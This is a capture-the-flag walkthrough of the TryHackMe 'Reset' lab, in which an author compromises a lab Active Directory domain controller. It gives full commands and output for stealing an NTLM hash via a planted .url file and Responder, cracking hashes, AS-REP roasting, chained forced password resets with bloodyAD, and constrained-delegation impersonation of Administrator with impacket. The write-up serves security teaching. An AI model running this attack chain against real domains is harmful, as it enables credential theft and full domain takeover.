# **Reset - TryHackMe**

*Target Ip. Address: 10.48.155.57*

Let'sstart with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.48.155.57
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-22 18:45 +0545
Nmap scan report for 10.48.155.57
Host is up (0.041s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-22 13:00:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-22T13:01:07+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2026-02-21T12:59:14
|_Not valid after:  2026-08-23T12:59:14
| rdp-ntlm-info:
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-22T13:00:27+00:00
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-02-22T13:00:31
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.71 seconds
```

We have basic AD services open. Let's add findings on our hosts file.

```bash
kali@kali:cat /etc/hosts
10.48.155.57    HayStack.thm.corp thm.corp reset.thm

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Let's see if we have guest logon allowed for SMB share.

```bash
kali@kali:smbclient -L \\10.48.155.57
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.48.155.57 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

That was successful. We see default shares except Data. Let's dive into that share.

```bash
kali@kali:smbclient \\\\10.48.155.57\\Data
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 19 14:25:57 2023
  ..                                  D        0  Wed Jul 19 14:25:57 2023
  onboarding                          D        0  Sun Feb 22 18:48:44 2026

                7863807 blocks of size 4096. 3000032 blocks available
smb: \> cd onboarding\
smb: \onboarding\> ls
  .                                   D        0  Sun Feb 22 18:48:44 2026
  ..                                  D        0  Sun Feb 22 18:48:44 2026
  2fcp21pc.mei.pdf                    A  3032659  Mon Jul 17 13:57:09 2023
  43if2ebr.bvd.pdf                    A  4700896  Mon Jul 17 13:56:53 2023
  ki1iblf4.2vl.txt                    A      521  Tue Aug 22 00:06:59 2023

                7863807 blocks of size 4096. 3000013 blocks available
```

So, we have onboarding directory and some files inside, which are of no use.

```bash
smb: \onboarding\> ls
  .                                   D        0  Sun Feb 22 18:50:45 2026
  ..                                  D        0  Sun Feb 22 18:50:45 2026
  mz0kckjl.5l3.txt                    A      521  Tue Aug 22 00:06:59 2023
  pb2ew04m.1d1.pdf                    A  3032659  Mon Jul 17 13:57:09 2023
  peaq1kfz.5ld.pdf                    A  4700896  Mon Jul 17 13:56:53 2023

                7863807 blocks of size 4096. 3000206 blocks available
```

But, if we wait for some time and list the files in that directory, we notice they are different. So, we can assume there there is someone or a service which is looking at those files. We can abuse this functionality to steal the NTLM hash of the moderator, with our specially crafted file.

So, to capture the NTLM hash, start a listener.

```bash
kali@kali:sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Sponsor this project: [USDT: TNS8ZhdkeiMCT6BpXnj4qPfWo3HpoACJwv] , [BTC: 15X984Qco6bUxaxiR8AmTnQQ5v1LJ2zpNo]

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]
.
.
.
.
.
[*] Version: Responder 3.2.0.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...
```

We will craft a special payload using ntlm_theft.py which can be found here. "*https://github.com/Greenwolf/ntlm_theft*"

```bash
kali@kali:python3 ntlm_theft.py -g url -s 192.168.130.26 -f theft
/home/kali/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: theft/theft-(url).url (BROWSE TO FOLDER)
Created: theft/theft-(icon).url (BROWSE TO FOLDER)
Generation Complete.
```

Now, our payload is ready, upload it in the share and let the moderator read that and we can capture the NTLM hash back in our responder.

```bash
smb: \onboarding\> put theft.url
putting file theft.url as \onboarding\theft.url (0.8 kB/s) (average 0.6 kB/s)
```

```bash
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.48.155.57
[SMB] NTLMv2-SSP Username : THM\AUTOMATE
[SMB] NTLMv2-SSP Hash     : AUTOMATE::THM:659d632003cf827c:6161A8E538416AD0FC3CEB3D68ECB232:0101.....000000000
```

Great !!! We got the NTLM hash for user AUTOMATE. Let's crack the hash we have.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Pa...d1        (AUTOMATE)
1g 0:00:00:00 DONE (2026-02-22 18:59) 5.882g/s 1337Kp/s 1337Kc/s 1337KC/s astigg..920227
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Since, we have a valid user, we can use bloodhound to map the entire domain for better visuals.

```bash
kali@kali:bloodhound-python -u 'AUTOMATE' -p 'Pa...d1' -d thm.corp -ns 10.48.155.57 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: thm.corp
INFO: Getting TGT for user
INFO: Connecting to LDAP server: haystack.thm.corp
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: haystack.thm.corp
INFO: Connecting to LDAP server: haystack.thm.corp
INFO: Found 42 usersINFO: Found 55 groups
INFO: Found 3 gpos
INFO: Found 222 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: HayStack.thm.corp
INFO: Done in 00M 25S
```

We have collected the inforamtion, let's visualize it.

```bash
kali@kali:sudo neo4j console
[sudo] password for kali: 
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2026-02-22 13:21:34.405+0000 INFO  Starting...
2026-02-22 13:21:35.097+0000 INFO  This instance is ServerId{018c2f85} (018c2f85-1552-4052-9b65-d6e59a00f65a)
2026-02-22 13:21:36.607+0000 INFO  ======== Neo4j 4.4.26 ========
2026-02-22 13:21:38.472+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2026-02-22 13:21:38.473+0000 INFO  Updating the initial password in component 'security-users'
2026-02-22 13:21:41.434+0000 INFO  Bolt enabled on localhost:7687.
2026-02-22 13:21:42.264+0000 INFO  Remote interface available at http://localhost:7474/
2026-02-22 13:21:42.268+0000 INFO  id: 7779F987B5F713663F08D4C235CEB20E6B20F97E249B5A487E08F588EE6529BD
2026-02-22 13:21:42.268+0000 INFO  name: system
2026-02-22 13:21:42.268+0000 INFO  creationDate: 2026-02-14T14:02:25.62Z
2026-02-22 13:21:42.268+0000 INFO  Started.
```
```bash
bloodhound                                                                                                                                               

Starting neo4j
Neo4j is running at pid 9509

 Bloodhound will start

 IMPORTANT: It will take time, please wait...

{"time":"2026-02-22T19:07:02.730757497+05:45","level":"INFO","message":"Reading configuration found at /etc/bhapi/bhapi.json"}
{"time":"2026-02-22T19:07:02.731189788+05:45","level":"INFO","message":"Logging configured","log_level":"INFO"}
{"time":"2026-02-22T19:07:02.799690095+05:45","level":"INFO","message":"No database driver has been set for migration, using: neo4j"}
{"time":"2026-02-22T19:07:02.799800686+05:45","level":"INFO","message":"Connecting to graph using Neo4j"}
{"time":"2026-02-22T19:07:02.802152524+05:45","level":"INFO","message":"Starting daemon Tools API"}
{"time":"2026-02-22T19:07:02.802312336+05:45","level":"INFO","message":"DogTags Configuration","namespace":"dogtags","flags":{"auth.environment_targeted_access_control":false,"privilege_zones.label_limit":0,"privilege_zones.multi_tier_analysis":false,"privilege_zones.tier_limit":1}}
{"time":"2026-02-22T19:07:02.855004787+05:45","level":"INFO","message":"No new SQL migrations to run"}
{"time":"2026-02-22T19:07:04.866140528+05:45","level":"INFO","message":"Executing extension data population","file":"ad_graph_schema.sql"}
{"time":"2026-02-22T19:07:04.979393437+05:45","level":"INFO","message":"Executing extension data population","file":"az_graph_schema.sql"}
{"time":"2026-02-22T19:07:04.991038518+05:45","level":"ERROR","message":"Error generating AzureHound manifest file: error reading downloads directory /etc/bloodhound/collectors/azurehound: open /etc/bloodhound/collectors/azurehound: no such file or directory"}
{"time":"2026-02-22T19:07:04.991116004+05:45","level":"ERROR","message":"Error generating SharpHound manifest file: error reading downloads directory /etc/bloodhound/collectors/sharphound: open /etc/bloodhound/collectors/sharphound: no such file or directory"}
{"time":"2026-02-22T19:07:05.014689593+05:45","level":"INFO","message":"Analysis requested by init"}
{"time":"2026-02-22T19:07:05.025026072+05:45","level":"INFO","message":"Starting daemon API Daemon"}
{"time":"2026-02-22T19:07:05.025127697+05:45","level":"INFO","message":"Starting daemon Data Pruning Daemon"}
{"time":"2026-02-22T19:07:05.025139429+05:45","level":"INFO","message":"Starting daemon Changelog Daemon"}
{"time":"2026-02-22T19:07:05.025143686+05:45","level":"INFO","message":"Starting daemon Data Pipe Daemon"}
{"time":"2026-02-22T19:07:05.025154336+05:45","level":"INFO","message":"Server started successfully"}
{"time":"2026-02-22T19:07:05.056924387+05:45","level":"INFO","message":"Running OrphanFileSweeper for path /var/lib/bhe/work/tmp"}
{"time":"2026-02-22T19:07:05.1077572+05:45","level":"INFO","message":"Graph Analysis","measurement_id":1}
{"time":"2026-02-22T19:07:05.605514763+05:45","level":"INFO","message":"GET /","proto":"HTTP/1.1","referer":"","user_agent":"curl/8.18.0","request_bytes":0,"response_bytes":38,"status":301,"elapsed":0.698982,"request_id":"4ccf19c6-2303-41f7-8237-82114aaba1dc","request_ip":"127.0.0.1","remote_addr":"127.0.0.1:53170"}

 opening http://127.0.0.1:8080
{"time":"2026-02-22T19:07:05.678662288+05:45","level":"INFO","message":"AGT: Pooling parameters","selector_worker_limit":"7","expansion_worker_limit":"3","dawgs_worker_limit":"2","agt_max_conn":"42"}
```

Neo4j is the database for bloodhound. The bloodhound UI will be available at "*http://127.0.0.1:8080*".

We know that our current user is part of Remote Management Users, so we can either RDP into the machine (if they are also in the Remote Desktop Users group) or use evil-winrm to establish a PowerShell Remoting session.

```bash
kali@kali:evil-winrm -i reset.thm -u AUTOMATE -p Passw0rd1                                                                    

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\automate\Documents>
```

Let's read the user flag, and we can get back to navigating attack path in bloodhound.

```bash
*Evil-WinRM* PS C:\Users\automate\Desktop> type user.txt
THM{AU.....US}
```

<img width="1284" height="944" alt="Screenshot 2026-02-22 193758" src="https://github.com/user-attachments/assets/70dfe2ce-f39e-4333-9ed4-198f6d88bd17" />

We find 3 of the users are AS-REP Roastable. Let's get their AS-REP Hash, so that we can crack them.

```bash
kali@kali:impacket-GetNPUsers thm.corp/ -usersfile users.txt -dc-ip 10.48.155.57 -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

$krb5asrep$23$ernesto_silva@THM.CORP:22b98360.....cd951
$krb5asrep$23$leann_long@THM.CORP:fe0b4bf2.....c10c9982
$krb5asrep$23$tabatha_britt@THM.CORP:c08b2bf.....cf4c1b
```

We got the AS-REP Hash, let's crack them.

```bash
kali@kali:john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt                                                                                        
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ma...5)   ($krb5asrep$23$tabatha_britt@THM.CORP)     
1g 0:00:00:30 DONE (2026-02-22 19:41) 0.03247g/s 465857p/s 1118Kc/s 1118KC/s  0841079575..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We successfully cracked the AS-REP hash for user tabatha_britt. Let's head to bloodhound to map the attack path.

<img width="1843" height="906" alt="image" src="https://github.com/user-attachments/assets/347bf8fd-3b52-4ab1-ba5b-f2f183d4cfdb" />

That's interesting. We now have a attack map for compromising the domain.

```bash
tabatha_britt —[GenericALL]—> shawna_bray —[ForceChangePassword]—> cruz_hall —[ForceChangePassword]—> darla_winters —[AllowedToDelegate]—> Haystack.thm.corp
```

Let's get into resetting the password. We will use bloodyAD for this.

First, let's change password of shawna_bray as tabatha_briit has GenericAll capability.

```bash
kali@kali:bloodyAD --host 10.48.155.57 -d thm.corp -u tabatha_britt -p 'ma...5)' set password shawna_bray 'NewPassword123!'
[+] Password changed successfully!
```

That was success. We can now reset the password of cruz_hall as shawna_bray.

```bash
kali@kali:bloodyAD --host 10.48.155.57 -d thm.corp -u shawna_bray -p 'NewPassword123!' set password cruz_hall 'NewPassword123!'
[+] Password changed successfully!
```

Now, we can reset the passsword of darla_winters as cruz_hall.

```bash
kali@kali:bloodyAD --host 10.48.155.57 -d thm.corp -u cruz_hall -p 'NewPassword123!' set password darla_winters 'NewPassword123!'
[+] Password changed successfully!
```

<img width="956" height="943" alt="Screenshot 2026-02-23 082544" src="https://github.com/user-attachments/assets/9bde5584-c5bc-40f5-a4a6-5b85a9a627ac" />

That's a lot of resetting. Now, all that is done. Since darla_winters is allowed to delegate, we used impacket-getST to perform a S4U2Proxy request, successfully impersonating the Administrator and saving the service ticket as a .ccache file.

```bash
kali@kali:impacket-getST -dc-ip 10.48.155.57 -spn cifs/HAYSTACK.thm.corp thm.corp/darla_winters:'NewPassword123!' -impersonate Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_HAYSTACK.thm.corp@THM.CORP.ccache
```

We have a ticket. Let's set our environment variable to point to the new cache file and use klist to verify that we are now holding a valid Service Ticket for the Administrator to access the CIFS service on HAYSTACK.

```bash
kali@kali:export KRB5CCNAME=Administrator@cifs_HAYSTACK.thm.corp@THM.CORP.ccache
```

```bash
kali@kali:klist
Ticket cache: FILE:Administrator@cifs_HAYSTACK.thm.corp@THM.CORP.ccache
Default principal: Administrator@thm.corp

Valid starting       Expires              Service principal
02/22/2026 19:51:41  02/23/2026 05:51:41  cifs/HAYSTACK.thm.corp@THM.CORP
        renew until 02/23/2026 19:51:40
```

We have all that set, now we can logon using impacket-wmiexec as user Administrator.

```bash
kali@kali:impacket-wmiexec -k -no-pass HAYSTACK.thm.corp
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
thm\administrator
```

We are indeed administrator. Let's read the final flag and end this challenge.

```bash
C:\Users\Administrator\Desktop>type root.txt
THM{RE.....TE}
```
